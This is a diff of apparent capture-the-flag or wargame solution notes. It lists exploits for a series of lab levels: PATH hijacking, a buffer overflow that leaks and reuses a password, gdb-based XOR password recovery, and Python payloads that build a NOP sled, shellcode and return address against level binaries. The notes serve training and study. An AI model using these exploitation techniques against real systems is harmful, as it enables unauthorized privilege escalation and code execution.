@@ -6,7 +6,7 @@ Level 3: changed the PATH variable to include a directory with a malicious progr
 
 Level 4: #!/usr/bin/bash
 password=$(echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" | /levels/level4/level4 | grep "^Password was:" | cut -d' ' -f3)
-(echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA${password}"; echo escalate; cat -) | /levels/level4/level4
+(echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA${password}"; cat -) | /levels/level4/level4
 
 Level 5: XOR each byte from the arrays at <PASSWD_KEY_3> and <PASSWD_PWD_1> through inspecting get_password with gdb and then getting the values from the addresses --> SuperVerySecretPassword
 
@@ -30,7 +30,7 @@ shot_at_nop_sled = b"\xe0\xe1\xff\xff\xff\x7f\x00\x00"
 number_input = b"\n2"   
 sys.stdout.buffer.write(nop_sled + shellcode + padding + shot_at_nop_sled + number_input)' | ./level8
 
-final command: python3 ~/level9.py 152 0x7fffffffe1e0 | ./level9 
+final command: python3 ~/level9.py 152 0x7fffffffe1e0 | /levels/level9/level9 
 
 Level 10: see level10.py
 
